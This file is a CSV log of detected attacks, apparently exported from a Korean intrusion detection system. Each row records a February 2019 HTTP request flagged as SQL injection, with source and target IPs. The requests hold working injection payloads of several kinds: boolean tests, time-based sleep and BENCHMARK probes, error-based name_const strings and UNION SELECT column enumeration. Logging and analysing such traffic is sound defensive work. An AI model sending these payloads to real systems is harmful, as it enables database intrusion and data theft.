장비발생시간,출발지IP,목적지IP,목적지포트,공격명,request
2019-02-22 2:13,81.177.139.181,121.125.77.69,80,SQL Injection,GET /list.php?id=dmk&recommend=1&page=1%20AND%201=1 HTTP/1.1
2019-02-22 2:13,81.177.139.181,121.125.77.69,80,SQL Injection,GET /list.php?recommend=1&page=1&id=dmk%27%20aND%20BeNChMaRK%282999999%2CMd5%28NoW%28%29%29%29%20AnD%20%271 HTTP/1.0
2019-02-22 2:32,190.228.29.221,121.125.77.69,80,SQL Injection,GET /list.php?page=788&id=dgm%27%20and%20%27x%27%3D%27y HTTP/1.1
2019-02-22 2:32,190.228.29.221,121.125.77.69,80,SQL Injection,GET /list.php?id=dgm&page=788%20and%201%3D1 HTTP/1.1
2019-02-22 2:32,190.228.29.221,121.125.77.69,80,SQL Injection,GET /list.php?id=dgm&page=788%20and%201%3E1 HTTP/1.1
2019-02-22 2:33,190.228.29.221,121.125.77.69,80,SQL Injection,GET /list.php?page=788&id=dgm%27%20AnD%20sLeep%283%29%20ANd%20%271 HTTP/1.0
2019-02-22 2:53,89.19.29.189,121.125.77.69,80,SQL Injection,GET /list.php?id=baseball_new7%27%20aND%20BeNChMaRK%282999999%2CMd5%28NoW%28%29%29%29%20AnD%20%271 HTTP/1.0
2019-02-22 2:53,89.19.29.189,121.125.77.69,80,SQL Injection,GET /list.php?id=baseball_new799999%22%20union%20select%20unhex(hex(version()))%20--%20%22x%22=%22x HTTP/1.1
2019-02-22 2:53,89.19.29.189,121.125.77.69,80,SQL Injection,GET /list.php?id=baseball_new7%27%20and%20%27x%27%3D%27x HTTP/1.1
2019-02-22 2:13,81.177.139.181,121.125.77.69,80,SQL Injection,GET /list.php?id=dmk&page=1&recommend=1%20and%201%3D1 HTTP/1.1
2019-02-22 2:13,81.177.139.181,121.125.77.69,80,SQL Injection,GET /list.php?id=dmk&recommend=1&page=1%27%20and%20%27x%27%3D%27y HTTP/1.1
2019-02-22 2:13,81.177.139.181,121.125.77.69,80,SQL Injection,"GET /list.php?id=dmk&recommend=1&page=1""%20and%20""x""%3D""x HTTP/1.1"
2019-02-22 2:13,81.177.139.181,121.125.77.69,80,SQL Injection,"GET /list.php?id=dmk&page=1&recommend=1""%20and%20""x""%3D""x HTTP/1.1"
2019-02-22 2:13,81.177.139.181,121.125.77.69,80,SQL Injection,GET /list.php?id=dmk&page=1&recommend=1%22%20and%20%22x%22%3D%22y HTTP/1.1
2019-02-22 2:13,81.177.139.181,121.125.77.69,80,SQL Injection,GET /list.php?recommend=1&page=1&id=dmk%27%26%26BeNChMaRK%282999999%2CmD5%28NOW%28%29%29%29%26%26%271 HTTP/1.0
2019-02-22 2:13,81.177.139.181,121.125.77.69,80,SQL Injection,GET /list.php?recommend=1&page=1&id=dmk%27%20AnD%20sLeep%283%29%20ANd%20%271 HTTP/1.0
2019-02-22 2:12,81.177.139.181,121.125.77.69,80,SQL Injection,GET /list.php?recommend=1&page=1&id=dmk%27%20and%20%27x%27%3D%27x HTTP/1.1
2019-02-22 2:13,81.177.139.181,121.125.77.69,80,SQL Injection,GET /list.php?id=dmk&recommend=1&page=199999%22%20union%20select%20unhex(hex(version()))%20--%20%22x%22=%22x HTTP/1.1
2019-02-22 2:13,81.177.139.181,121.125.77.69,80,SQL Injection,"GET /list.php?id=dmk&recommend=1&page=1%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20and%201%3D1 HTTP/1.1"
2019-02-22 2:13,81.177.139.181,121.125.77.69,80,SQL Injection,"GET /list.php?id=dmk&recommend=1&page=1%22%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20%22x%22=%22x HTTP/1.1"
2019-02-22 2:33,190.228.29.221,121.125.77.69,80,SQL Injection,"GET /list.php?id=dgm&page=788%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20and%201%3D1 HTTP/1.1"
2019-02-22 2:33,190.228.29.221,121.125.77.69,80,SQL Injection,"GET /list.php?id=dgm&page=788%27%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20%27x%27=%27x HTTP/1.1"
2019-02-22 2:33,190.228.29.221,121.125.77.69,80,SQL Injection,GET /list.php?id=dgm&page=78899999%27%20union%20select%20unhex(hex(version()))%20--%20%27x%27=%27x HTTP/1.1
2019-02-22 2:33,190.228.29.221,121.125.77.69,80,SQL Injection,GET /list.php?page=788&id=dgm%27%20aND%20BeNChMaRK%282999999%2CMd5%28NoW%28%29%29%29%20AnD%20%271 HTTP/1.0
2019-02-22 2:33,190.228.29.221,121.125.77.69,80,SQL Injection,GET /list.php?id=dgm&page=788%22%20and%20%22x%22%3D%22y HTTP/1.1
2019-02-22 2:33,190.228.29.221,121.125.77.69,80,SQL Injection,GET /list.php?page=788&id=dgm%27%26%26sLEEp%283%29%26%26%271 HTTP/1.0
2019-02-22 2:33,190.228.29.221,121.125.77.69,80,SQL Injection,GET /list.php?id=dgm&page=788%27%20and%20%27x%27%3D%27x HTTP/1.1
2019-02-22 2:33,190.228.29.221,121.125.77.69,80,SQL Injection,GET /list.php?id=dgm&page=788999999.1%20union%20select%20unhex(hex(version()))%20--%20and%201%3D1 HTTP/1.1
2019-02-22 2:33,190.228.29.221,121.125.77.69,80,SQL Injection,GET /list.php?page=788&id=dgm%27%26%26BeNChMaRK%282999999%2CmD5%28NOW%28%29%29%29%26%26%271 HTTP/1.0
2019-02-22 2:32,190.228.29.221,121.125.77.69,80,SQL Injection,"GET /list.php?page=788&id=dgm""%20and%20""x""%3D""x HTTP/1.1"
2019-02-22 2:32,190.228.29.221,121.125.77.69,80,SQL Injection,GET /list.php?page=788&id=dgm%22%20and%20%22x%22%3D%22y HTTP/1.1
2019-02-22 2:53,89.19.29.189,121.125.77.69,80,SQL Injection,GET /list.php?id=baseball_new7%27%20AnD%20sLeep%283%29%20ANd%20%271 HTTP/1.0
2019-02-22 2:53,89.19.29.189,121.125.77.69,80,SQL Injection,GET /list.php?id=baseball_new7%27%26%26BeNChMaRK%282999999%2CmD5%28NOW%28%29%29%29%26%26%271 HTTP/1.0
2019-02-22 2:53,89.19.29.189,121.125.77.69,80,SQL Injection,GET /list.php?id=baseball_new7%27%20AnD%20sLeep%283%29%20ANd%20%270%27%3D%270 HTTP/1.0
2019-02-22 2:53,89.19.29.189,121.125.77.69,80,SQL Injection,"GET /list.php?id=baseball_new7%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20and%201%3D1 HTTP/1.1"
2019-02-22 2:53,89.19.29.189,121.125.77.69,80,SQL Injection,GET /list.php?id=baseball_new7%27%20and%20%27x%27%3D%27y HTTP/1.1
2019-02-22 2:53,89.19.29.189,121.125.77.69,80,SQL Injection,"GET /list.php?id=baseball_new7%27%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20%27x%27=%27x HTTP/1.1"
2019-02-21 20:08,97.74.24.136,121.125.77.69,80,SQL Injection,GET /view.php?id=dong_eui&no=242%20and%201%3D1 HTTP/1.1
2019-02-21 20:08,97.74.24.136,121.125.77.69,80,SQL Injection,GET /view.php?id=dong_eui&no=242%20and%201%3E1 HTTP/1.1
2019-02-21 20:08,97.74.24.136,121.125.77.69,80,SQL Injection,GET /view.php?no=242&id=dong_eui%27%26%26sLEEp%283%29%26%26%271 HTTP/1.0
2019-02-21 20:08,97.74.24.136,121.125.77.69,80,SQL Injection,GET /view.php?no=242&id=dong_eui%27%20AnD%20sLeep%283%29%20ANd%20%271 HTTP/1.0
2019-02-21 20:08,97.74.24.136,121.125.77.69,80,SQL Injection,GET /view.php?id=dong_eui&no=242%27%20and%20%27x%27%3D%27x HTTP/1.1
2019-02-21 20:08,97.74.24.136,121.125.77.69,80,SQL Injection,GET /view.php?id=dong_eui&no=242%27%20and%20%27x%27%3D%27y HTTP/1.1
2019-02-21 20:08,97.74.24.136,121.125.77.69,80,SQL Injection,"GET /view.php?id=dong_eui&no=242""%20and%20""x""%3D""x HTTP/1.1"
2019-02-21 20:08,97.74.24.136,121.125.77.69,80,SQL Injection,GET /view.php?no=242&id=dong_eui%27%20and%20%27x%27%3D%27x HTTP/1.1
2019-02-21 20:08,97.74.24.136,121.125.77.69,80,SQL Injection,GET /view.php?no=242&id=dong_eui%27%20aND%20BeNChMaRK%282999999%2CMd5%28NoW%28%29%29%29%20AnD%20%271 HTTP/1.0
2019-02-21 20:08,97.74.24.136,121.125.77.69,80,SQL Injection,GET /view.php?no=242&id=dong_eui%27%26%26BeNChMaRK%282999999%2CmD5%28NOW%28%29%29%29%26%26%271 HTTP/1.0
2019-02-21 20:08,97.74.24.136,121.125.77.69,80,SQL Injection,GET /view.php?no=242&id=dong_eui%27%20AnD%20sLeep%283%29%20ANd%20%270%27%3D%270 HTTP/1.0
2019-02-21 20:10,97.74.24.136,121.125.77.69,80,SQL Injection,"GET /view.php?id=dong_eui&no=242%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20and%201%3D1 HTTP/1.1"
2019-02-21 20:10,97.74.24.136,121.125.77.69,80,SQL Injection,"GET /view.php?id=dong_eui&no=242%22%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20%22x%22=%22x HTTP/1.1"
2019-02-21 20:08,97.74.24.136,121.125.77.69,80,SQL Injection,GET /view.php?no=242&id=dong_eui%22%20and%20%22x%22%3D%22y HTTP/1.1
2019-02-21 20:10,97.74.24.136,121.125.77.69,80,SQL Injection,"GET /view.php?id=dong_eui&no=242%27%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20%27x%27=%27x HTTP/1.1"
2019-02-21 20:08,97.74.24.136,121.125.77.69,80,SQL Injection,GET /view.php?no=242&id=dong_eui%27%20and%20%27x%27%3D%27y HTTP/1.1
2019-02-21 20:08,97.74.24.136,121.125.77.69,80,SQL Injection,"GET /view.php?no=242&id=dong_eui""%20and%20""x""%3D""x HTTP/1.1"
2019-02-21 20:08,97.74.24.136,121.125.77.69,80,SQL Injection,GET /view.php?id=dong_eui&no=242%22%20and%20%22x%22%3D%22y HTTP/1.1
2019-02-21 20:08,97.74.24.136,121.125.77.69,80,SQL Injection,GET /view.php?id=dong_eui&no=242%20AND%201=1 HTTP/1.1
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,GET /view.php?id=bitcoins&no=2606899999999.1%20union%20select%20unhex(hex(version()))%20--%20and%201%3D1 HTTP/1.1
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,GET /view.php?id=bitcoins&no=260689999999%22%20union%20select%20unhex(hex(version()))%20--%20%22x%22=%22x HTTP/1.1
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,"GET /view.php?no=2606899&id=bitcoins""%20and%20""x""%3D""x HTTP/1.1"
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,GET /view.php?id=bitcoins&no=260689999999%27%20union%20select%20unhex(hex(version()))%20--%20%27x%27=%27x HTTP/1.1
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,GET /view.php?id=bitcoins&no=2606899%20AND%201=1 HTTP/1.1
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,GET /view.php?no=2606899&id=bitcoins%27%26%26sLEEp%283%29%26%26%271 HTTP/1.0
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,GET /view.php?no=2606899&id=bitcoins%22%20and%20%22x%22%3D%22y HTTP/1.1
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,GET /view.php?id=bitcoins&no=2606899%20and%201%3D1 HTTP/1.1
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,GET /view.php?id=bitcoins&no=2606899%27%20and%20%27x%27%3D%27x HTTP/1.1
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,GET /view.php?no=2606899&id=bitcoins%27%20AnD%20sLeep%283%29%20ANd%20%271 HTTP/1.0
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,GET /view.php?id=bitcoins&no=2606899%20and%201%3E1 HTTP/1.1
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,"GET /view.php?id=bitcoins&no=2606899%27%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20%27x%27=%27x HTTP/1.1"
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,"GET /view.php?id=bitcoins&no=2606899%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20and%201%3D1 HTTP/1.1"
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,"GET /view.php?id=bitcoins&no=2606899%22%20or%20(1,2)=(select*from(select%20name_const(CHAR(111,108,111,108,111,115,104,101,114),1),name_const(CHAR(111,108,111,108,111,115,104,101,114),1))a)%20--%20%22x%22=%22x HTTP/1.1"
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,GET /view.php?id=bitcoins&no=2606899%27%20and%20%27x%27%3D%27y HTTP/1.1
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,"GET /view.php?id=bitcoins&no=2606899""%20and%20""x""%3D""x HTTP/1.1"
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,GET /view.php?no=2606899&id=bitcoins%27%20AnD%20sLeep%283%29%20ANd%20%270%27%3D%270 HTTP/1.0
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,GET /view.php?no=2606899&id=bitcoins%27%20and%20%27x%27%3D%27y HTTP/1.1
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,GET /view.php?no=2606899&id=bitcoins%27%20aND%20BeNChMaRK%282999999%2CMd5%28NoW%28%29%29%29%20AnD%20%271 HTTP/1.0
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,GET /view.php?no=2606899&id=bitcoins%27%26%26BeNChMaRK%282999999%2CmD5%28NOW%28%29%29%29%26%26%271 HTTP/1.0
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,GET /view.php?no=2606899&id=bitcoins%27%20and%20%27x%27%3D%27x HTTP/1.1
2019-02-21 12:26,23.91.70.139,121.125.77.69,80,SQL Injection,GET /view.php?id=bitcoins&no=2606899%22%20and%20%22x%22%3D%22y HTTP/1.1
2019-02-21 11:43,211.236.165.66,121.125.77.52,443,SQL Injection,GET /auth/?command=attach&broker=dcinside&token=23vof5nmjelco8ckogwc40wgw&checksum=1a5de216071c8c7d12a56c7aaa90282beb0b710d0f11beb322364204dbbd7ba6&id=aion&no=1487&page=21198&view_comment=1%27+or+%281%2C2%29%3D%28select%2Afrom%28select+name_const%28CHAR%28111%2C108%2C111%2C108%2C111%2C115%2C104%2C101%2C114%29%2C1%29%2Cname_const%28CHAR%28111%2C108%2C111%2C108%2C111%2C115%2C104%2C101%2C114%29%2C1%29%29a%29+--+%27x%27%3D%27x&return_url=https%3A%2F%2Fdcid.dcinside.com%2Fjoin%2Flogin.php%3Fid%3Daion%26no%3D1487%26page%3D21198%26view_comment%3D1%2527%2520or%2520%281%2C2%29%3D%28select%2Afrom%28select%2520name_const%28CHAR%28111%2C108%2C111%2C108%2C111%2C115%2C104%2C101%2C114%29%2C1%29%2Cname_const%28CHAR%28111%2C108%2C111%2C108%2C111%2C115%2C104%2C101%2C114%29%2C1%29%29a%29%2520--%2520%2527x%2527%3D%2527x HTTP/1.1
2019-02-21 2:42,45.64.130.212,121.125.77.23,80,SQL Injection,"GET /index.php?redirect=no&title=%ED%83%80%EC%BF%A0%EB%A7%88_%EC%82%AC%EC%B9%B4%EC%9E%90%ED%82%A41111111111111%27 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45),CHAR(45,120,50,53,45,81,45),CHAR(45,120,50,54,45,81,45),CHAR(45,120,50,55,45,81,45),CHAR(45,120,50,56,45,81,45),CHAR(45,120,50,57,45,81,45),CHAR(45,120,51,48,45,81,45),CHAR(45,120,51,49,45,81,45),CHAR(45,120,51,50,45,81,45),CHAR(45,120,51,51,45,81,45),CHAR(45,120,51,52,45,81,45),CHAR(45,120,51,53,45,81,45),CHAR(45,120,51,54,45,81,45),CHAR(45,120,51,55,45,81,45),CHAR(45,120,51,56,45,81,45) -- /* order by %27as HTTP/1.1"
2019-02-21 2:42,45.64.130.212,121.125.77.23,80,SQL Injection,"GET /index.php?redirect=no&title=%ED%83%80%EC%BF%A0%EB%A7%88_%EC%82%AC%EC%B9%B4%EC%9E%90%ED%82%A41111111111111%27 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45),CHAR(45,120,50,53,45,81,45),CHAR(45,120,50,54,45,81,45),CHAR(45,120,50,55,45,81,45),CHAR(45,120,50,56,45,81,45),CHAR(45,120,50,57,45,81,45),CHAR(45,120,51,48,45,81,45),CHAR(45,120,51,49,45,81,45),CHAR(45,120,51,50,45,81,45),CHAR(45,120,51,51,45,81,45),CHAR(45,120,51,52,45,81,45),CHAR(45,120,51,53,45,81,45),CHAR(45,120,51,54,45,81,45),CHAR(45,120,51,55,45,81,45),CHAR(45,120,51,56,45,81,45),CHAR(45,120,51,57,45,81,45),CHAR(45,120,52,48,45,81,45) -- /* order by %27as HTTP/1.1"
2019-02-21 2:43,45.64.130.212,121.125.77.23,80,SQL Injection,"GET /index.php?redirect=no&title=%ED%83%80%EC%BF%A0%EB%A7%88_%EC%82%AC%EC%B9%B4%EC%9E%90%ED%82%A41111111111111%22 UNION SELECT CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45) -- /* order by %22as HTTP/1.1"
2019-02-21 2:42,45.64.130.212,121.125.77.23,80,SQL Injection,"GET /index.php?redirect=no&title=%ED%83%80%EC%BF%A0%EB%A7%88_%EC%82%AC%EC%B9%B4%EC%9E%90%ED%82%A41111111111111%20UNION%20SELECT%20CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45)%20--%20 HTTP/1.1"
2019-02-21 2:42,45.64.130.212,121.125.77.23,80,SQL Injection,"GET /index.php?redirect=no&title=%ED%83%80%EC%BF%A0%EB%A7%88_%EC%82%AC%EC%B9%B4%EC%9E%90%ED%82%A41111111111111%20UNION%20SELECT%20CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45)%20--%20 HTTP/1.1"
2019-02-21 2:42,45.64.130.212,121.125.77.23,80,SQL Injection,"GET /index.php?redirect=no&title=%ED%83%80%EC%BF%A0%EB%A7%88_%EC%82%AC%EC%B9%B4%EC%9E%90%ED%82%A41111111111111%20UNION%20SELECT%20CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45)%20--%20 HTTP/1.1"
2019-02-21 2:42,45.64.130.212,121.125.77.23,80,SQL Injection,"GET /index.php?redirect=no&title=%ED%83%80%EC%BF%A0%EB%A7%88_%EC%82%AC%EC%B9%B4%EC%9E%90%ED%82%A41111111111111%20UNION%20SELECT%20CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45)%20--%20 HTTP/1.1"
2019-02-21 2:42,45.64.130.212,121.125.77.23,80,SQL Injection,"GET /index.php?redirect=no&title=%ED%83%80%EC%BF%A0%EB%A7%88_%EC%82%AC%EC%B9%B4%EC%9E%90%ED%82%A41111111111111%20UNION%20SELECT%20CHAR(45,120,49,45,81,45),CHAR(45,120,50,45,81,45),CHAR(45,120,51,45,81,45),CHAR(45,120,52,45,81,45),CHAR(45,120,53,45,81,45),CHAR(45,120,54,45,81,45),CHAR(45,120,55,45,81,45),CHAR(45,120,56,45,81,45),CHAR(45,120,57,45,81,45),CHAR(45,120,49,48,45,81,45),CHAR(45,120,49,49,45,81,45),CHAR(45,120,49,50,45,81,45),CHAR(45,120,49,51,45,81,45),CHAR(45,120,49,52,45,81,45),CHAR(45,120,49,53,45,81,45),CHAR(45,120,49,54,45,81,45),CHAR(45,120,49,55,45,81,45),CHAR(45,120,49,56,45,81,45),CHAR(45,120,49,57,45,81,45),CHAR(45,120,50,48,45,81,45),CHAR(45,120,50,49,45,81,45),CHAR(45,120,50,50,45,81,45),CHAR(45,120,50,51,45,81,45),CHAR(45,120,50,52,45,81,45),CHAR(45,120,50,53,45,81,45),CHAR(45,120,50,54,45,81,45),CHAR(45,120,50,55,45,81,45),CHAR(45,120,50,56,45,81,45),CHAR(45,120,50,57,45,81,45),CHAR(45,120,51,48,45,81,45),CHAR(45,120,51,49,45,81,45),CHAR(45,120,51,50,45,81,45),CHAR(45,120,51,51,45,81,45),CHAR(45,120,51,52,45,81,45),CHAR(45,120,51,53,45,81,45),CHAR(45,120,51,54,45,81,45),CHAR(45,120,51,55,45,81,45),CHAR(45,120,51,56,45,81,45),CHAR(45,120,51,57,45,81,45),CHAR(45,120,52,48,45,81,45),CHAR(45,120,52,49,45,81,45),CHAR(45,120,52,50,45,81,45),CHAR(45,120,52,51,45,81,45),CHAR(45,120,52,52,45,81,45),CHAR(45,120,52,53,45,81,45),CHAR(45,120,52,54,45,81,45),CHAR(45,120,52,55,45,81,45),CHAR(45,120,52,56,45,81,45),CHAR(45,120,52,57,45,81,45)%20--%20 HTTP/1.1"
